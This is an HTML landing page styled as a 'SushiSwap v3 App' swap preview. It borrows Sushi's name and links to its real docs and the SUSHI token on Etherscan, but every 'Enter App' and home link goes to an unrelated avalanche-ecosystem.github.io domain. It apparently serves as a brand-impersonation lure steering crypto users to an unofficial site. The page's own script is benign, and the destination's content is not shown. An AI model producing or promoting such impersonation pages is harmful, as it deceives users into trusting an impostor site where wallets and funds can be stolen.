<body>
  <header class="topbar">
    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="SushiSwap v3 App home">
      <img src="favicon.png" width="28" height="28" alt="">

    </a>
    <nav class="nav" aria-label="Trusted references">
      <a href="https://etherscan.io/token/0x6B3595068778DD592e39A122f4f5a5cF09C90fE2" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>

      <a href="https://docs.sushi.com/" target="_blank" rel="nofollow noopener noreferrer">Docs</a>
    </nav>
    <span class="spacer"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-labelledby="page-title">
      <h1 id="page-title">SushiSwap v3 App</h1>
      <p class="sub"><strong>SushiSwap v3 App</strong> is a focused web interface for previewing a USDC to SUSHI swap path before entering the app.</p>
    </section>

    <section class="swap-card" aria-label="Swap preview">
      <div class="route">
        <div class="leg">
          <span class="label">From</span>
          <span class="chip">
            <img class="token" src="usdc.png" width="28" height="28" alt="USDC">
            <span class="ticker">USDC</span>
          </span>
        </div>
        <button class="switch" type="button" data-switch aria-label="Switch direction">
          <span aria-hidden="true">&rarr;</span>
        </button>
        <div class="leg">
          <span class="label">To</span>
          <span class="chip">
            <img class="token" src="sushi.png" width="28" height="28" alt="SUSHI">
            <span class="ticker">SUSHI</span>
          </span>
        </div>
      </div>
      <a class="enter" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&rsaquo;</span></a>
      <p class="note">Preview only</p>
    </section>
  </main>

  <footer class="foot"><b>SushiSwap v3 App</b> &mdash; 2026</footer>

  <script>
  (function () {
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;
    button.addEventListener("click", function () {
      var chips = document.querySelectorAll(".leg .chip");
      if (chips.length < 2) return;
      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
    });
  }());
  </script>
</body>
